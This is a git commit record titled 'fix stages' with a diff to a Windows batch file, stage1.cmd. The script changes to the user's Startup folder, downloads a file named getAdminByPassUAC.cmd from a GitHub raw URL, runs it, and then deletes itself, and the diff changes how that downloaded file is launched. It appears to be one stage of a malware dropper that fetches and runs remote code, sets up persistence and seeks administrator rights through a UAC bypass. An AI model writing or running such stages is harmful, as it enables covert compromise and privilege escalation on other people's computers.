6b4689d500412c65543b36dd10761719ce6d5f4f
Thông Tấn <ttthong315@gmail.com>
2025-05-08 00:09:30 +0700

    fix stages

--- stage1.cmd
+++ stage1.cmd
@@ -4,7 +4,7 @@ cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/main/getAdminByPassUAC.cmd' -OutFile 'getAdminByPassUAC.cmd'"
 
-powershell -ExecutionPolicy Bypass -File "getAdminByPassUAC.cmd"
+.\getAdminByPassUAC.cmd
 
 cd "%HERE%"
 del "%~f0"
